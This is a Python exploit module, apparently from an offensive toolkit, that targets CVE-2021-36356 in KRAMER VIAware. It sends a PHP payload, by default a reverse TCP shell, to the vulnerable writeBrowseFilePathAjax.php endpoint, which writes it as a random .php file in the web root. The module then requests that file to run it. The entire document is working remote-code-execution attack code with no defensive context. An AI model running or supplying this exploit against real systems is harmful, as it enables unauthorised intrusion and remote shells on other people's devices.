from deathnote_module import *
from lib.http.http_client import Http_client

class Module(Exploit, Http_client):
	

	__info__ = {
		'name': "kramer_VIAware RCE",
		'description': "KRAMER VIAware through August 2021 allows remote attackers to execute arbitrary"\
						"code because ajaxPages/writeBrowseFilePathAjax.php accepts arbitrary executable pathnames",
		'cve': '2021-36356',
		'payload': {
			'default': 'payloads/singles/php/reverse_tcp',
			'arch': 'php',
			'category': 'category',
			}			
		}	

	def run(self):

		headers = {
			"Host": f"{self.target}",
			"Accept": "text/html, */*",
			"Accept-Language": "en-GB,en;q=0.5",
			"Accept-Encoding": "gzip, deflate",
			"Content-Type": "application/x-www-form-urlencoded",
			"X-Requested-With": "XMLHttpRequest",
			"Sec-Fetch-Dest": "empty",
			"Sec-Fetch-Mode": "cors",
			"Sec-Fetch-Site": "same-origin",
			"Sec-Gpc": "1",
			"Te": "trailers",
			"Connection": "close"
		}
  
		filename = self.random_text(10)
		data = {
			"radioBtnVal": f"<?php {self.payload} ?>",
			"associateFileName": f"/var/www/html/{filename}.php"
		}

		r = self.http_request(method="POST",
							path="/ajaxPages/writeBrowseFilePathAjax.php",
							headers=headers,
							data=data,
							verify=False)

		if r:
			pwn = self.http_request(method="GET",
                           		path=f"{filename}.php",
                             	verify=False)
			if pwn != 200:
				self.not_vulnerable()
